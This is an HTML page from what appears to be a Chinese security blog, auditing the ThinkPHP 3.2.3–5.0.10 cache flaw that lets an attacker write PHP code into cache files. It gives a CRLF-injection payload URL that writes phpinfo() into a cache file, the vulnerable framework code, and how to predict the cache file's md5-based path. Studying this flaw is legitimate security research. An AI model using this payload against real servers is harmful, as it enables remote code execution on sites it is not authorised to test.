@@ -1,0 +1,346 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>PHP代码审计—ThinkPHP5.0.10-3.2.3缓存Getshell | bewhale&#39;s blog</title>
+
+<link rel="shortcut icon" href="https://bewhale.github.io/favicon.ico?v=1666713403567">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://bewhale.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+    
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            bewhale&#39;s blog
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/tools" class="menu gt-a-link">
+                    在线工具
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1666713403567"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    PHP代码审计—ThinkPHP5.0.10-3.2.3缓存Getshell
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-01-15 ·
+                    </time>
+                    
+                        <a href="https://bewhale.github.io/tag/zuB-zqMRV/" class="post-tags">
+                            # PHP代码审计
+                        </a>
+                    
+                        <a href="https://bewhale.github.io/tag/I8zfItXpKf/" class="post-tags">
+                            # ThinkPHP
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="前言">前言</h1>
+<p>thinkphp缓存漏洞的触发点以及生成的缓存文件的文件名 一般需要结合代码 审计来找到，<br>
+因为使用<code>S()</code> 或者 <code>Cache()</code> 函数的位置不确定，调用函数的传参变量也不确定</p>
+<h1 id="thinkphp323">thinkphp3.2.3</h1>
+<h2 id="漏洞复现">漏洞复现</h2>
+<p>控制器添加test方法，如下</p>
+<pre><code class="language-php">&lt;?php
+namespace Home\Controller;
+use Think\Controller;
+class IndexController extends Controller {
+    public function index(){
+        $this-&gt;show('&lt;style type=&quot;text/css&quot;&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: &quot;微软雅黑&quot;; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V{$Think.version}&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://ad.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;thinkad id=&quot;ad_55e75dfae343f5a1&quot;&gt;&lt;/thinkad&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;','utf-8');
+    }
+
+    public function test(){
+        S('cache',I('x'));
+    }
+}
+</code></pre>
+<p>浏览器访问</p>
+<pre><code class="language-php">http://192.168.1.8/index.php?s=/Home/index/test&amp;x=test
+</code></pre>
+<p>在<code>Application/Runtime/Temp/</code>文件夹下成功生成了php文件</p>
+<pre><code class="language-php">&lt;?php
+//000000000000s:4:&quot;test&quot;;
+?&gt;
+</code></pre>
+<p>传参内容被注释掉了，参数未过滤<code>%0d%0a</code></p>
+<p>可以以此来绕过行注释，访问</p>
+<pre><code class="language-php">http://192.168.1.8/index.php?s=/Home/index/test&amp;x=%0d%0aphpinfo();//
+</code></pre>
+<p>成功绕过注释,生成文件 <code>0fea6a13c52b4d4725368f24b045ca84.php</code>,<br>
+因为调用缓存函数时传参是  <code>S('cache',I('x'));</code><br>
+所以生成的缓存文件名是 md5(cache).php</p>
+<pre><code>&lt;?php
+//000000000000s:16:&quot;
+phpinfo();
+//&quot;;
+?&gt;
+
+url:
+http://192.168.1.8/Application/Runtime/Temp/0fea6a13c52b4d4725368f24b045ca84.php
+</code></pre>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>首先跟进<code>S</code> 方法，经过一系列判断调用了 <code>set</code> 方法</p>
+<pre><code class="language-php">function S($name,$value='',$options=null) {
+    static $cache   =   '';
+    if(is_array($options)){
+        // 缓存操作的同时初始化
+        $type       =   isset($options['type'])?$options['type']:'';
+        $cache      =   Think\Cache::getInstance($type,$options);
+    }elseif(is_array($name)) { // 缓存初始化
+        $type       =   isset($name['type'])?$name['type']:'';
+        $cache      =   Think\Cache::getInstance($type,$name);
+        return $cache;
+    }elseif(empty($cache)) { // 自动初始化
+        $cache      =   Think\Cache::getInstance();
+    }
+    if(''=== $value){ // 获取缓存
+        return $cache-&gt;get($name);
+    }elseif(is_null($value)) { // 删除缓存
+        return $cache-&gt;rm($name);
+    }else { // 缓存数据
+        if(is_array($options)) {
+            $expire     =   isset($options['expire'])?$options['expire']:NULL;
+        }else{
+            $expire     =   is_numeric($options)?$options:NULL;
+        }
+        return $cache-&gt;set($name, $value, $expire);
+    }
+}
+</code></pre>
+<p>然后跟进到<code>/Library/Think/Cache/File.class.php</code>文件，可以看到</p>
+<p><code>$data</code> 未经任何过滤，序列化过后，直接被写到文件内</p>
+<p>序列化过后，payload被有双引号包裹，最后还有分号</p>
+<pre><code>s:10:&quot;phpinfo();&quot;;
+</code></pre>
+<p>然后在前面拼接上注释符号，所以这里在payload前面使用 <code>%0d%0a</code> 回车换行绕过，</p>
+<p>后面我们在payload后面添加注释符，注释掉序列化数据生成的<code>&quot;</code>和<code>;</code></p>
+<p>payload:</p>
+<pre><code class="language-php">http://192.168.1.8/index.php?s=/Home/index/test&amp;x=%0d%0aphpinfo();//
+</code></pre>
+<pre><code class="language-php">    public function set($name,$value,$expire=null) {
+        N('cache_write',1);
+        if(is_null($expire)) {
+            $expire =  $this-&gt;options['expire'];
+        }
+        $filename   =   $this-&gt;filename($name);
+        $data   =   serialize($value);
+        if( C('DATA_CACHE_COMPRESS') &amp;&amp; function_exists('gzcompress')) {
+            //数据压缩
+            $data   =   gzcompress($data,3);
+        }
+        if(C('DATA_CACHE_CHECK')) {//开启数据校验
+            $check  =  md5($data);
+        }else {
+            $check  =  '';
+        }
+        $data    = &quot;&lt;?php\n//&quot;.sprintf('%012d',$expire).$check.$data.&quot;\n?&gt;&quot;;
+        $result  =   file_put_contents($filename,$data);
+        if($result) {
+            if($this-&gt;options['length']&gt;0) {
+                // 记录缓存队列
+                $this-&gt;queue($name);
+            }
+            clearstatcache();
+            return true;
+        }else {
+            return false;
+        }
+    }
+</code></pre>
+<p>跟进<code>   $this-&gt;filename($name)</code>方法</p>
+<pre><code class="language-php">    private function filename($name) {
+        $name	=	md5(C('DATA_CACHE_KEY').$name);
+        if(C('DATA_CACHE_SUBDIR')) {
+            // 使用子目录
+            $dir   ='';
+            for($i=0;$i&lt;C('DATA_PATH_LEVEL');$i++) {
+                $dir	.=	$name{$i}.'/';
+            }
+            if(!is_dir($this-&gt;options['temp'].$dir)) {
+                mkdir($this-&gt;options['temp'].$dir,0755,true);
+            }
+            $filename	=	$dir.$this-&gt;options['prefix'].$name.'.php';
+        }else{
+            $filename	=	$this-&gt;options['prefix'].$name.'.php';
+        }
+        return $this-&gt;options['temp'].$filename;
+    }
+</code></pre>
+<p>文件名 由 调用缓存函数时传参<code>$name</code> 和 配置文件里面的参数<code>DATA_CACHE_KEY</code>、<code>DATA_CACHE_SUBDIR</code>、<code>DATA_CACHE_PREFIX</code></p>
+<p>共同决定，但是配置文件里面这些参数一般默认为空</p>
+<pre><code class="language-php">S('cache',I('x'));  
+// 所以一般情况下文件名为 md5(cache).php
+// 0fea6a13c52b4d4725368f24b045ca84.php
+</code></pre>
+<h1 id="thinkphp505">thinkphp5.0.5</h1>
+<p>原理类似，缓存文件的路径不一样</p>
+<pre><code class="language-php">protected function getCacheKey($name)
+    {
+        $name = md5($name);
+        if ($this-&gt;options['cache_subdir']) {
+            // 使用子目录
+            $name = substr($name, 0, 2) . DS . substr($name, 2);
+        }
+        if ($this-&gt;options['prefix']) {
+            $name = $this-&gt;options['prefix'] . DS . $name;
+        }
+        $filename = $this-&gt;options['path'] . $name . '.php';
+        $dir      = dirname($filename);
+        if (!is_dir($dir)) {
+            mkdir($dir, 0755, true);
+        }
+        return $filename;
+    }
+</code></pre>
+<p>缓存文件位置 b0 文件夹是 md5($name) 前 2 位。</p>
+<p>http://domain/runtime/cache/b0/b068931cc450442b63f5b3d276ea4297.php</p>
+<h1 id="参考文章">参考文章</h1>
+<p><a href="https://blog.csdn.net/fly_hps/article/details/84952890">ThinkPHP3.2.3~5.0.10缓存函数设计缺陷可导致Getshell</a></p>
+<p><a href="https://h3art3ars.github.io/2019/12/16/Thinkphp3-2-3-5-0-10%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/">Thinkphp3.2.3-5.0.10缓存漏洞 | h3art3ars</a></p>
+<p><a href="https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-5.x-%E6%BC%8F%E6%B4%9E/Thinkphp-5.0.5-%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E.html">Thinkphp-5.0.5-缓存漏洞 - Thinkphp/Thinkphp-5.x-漏洞</a></p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://bewhale.github.io/post/PHP代码审计—ThinkPHP3.2.3反序列化/" class="post-title gt-a-link">
+                    PHP代码审计—ThinkPHP3.2.3反序列化
+                </a>
+            </div>
+        
+
+        
+
+        
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first"></div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/bewhale" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/bewhale" target="_blank">bewhale</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
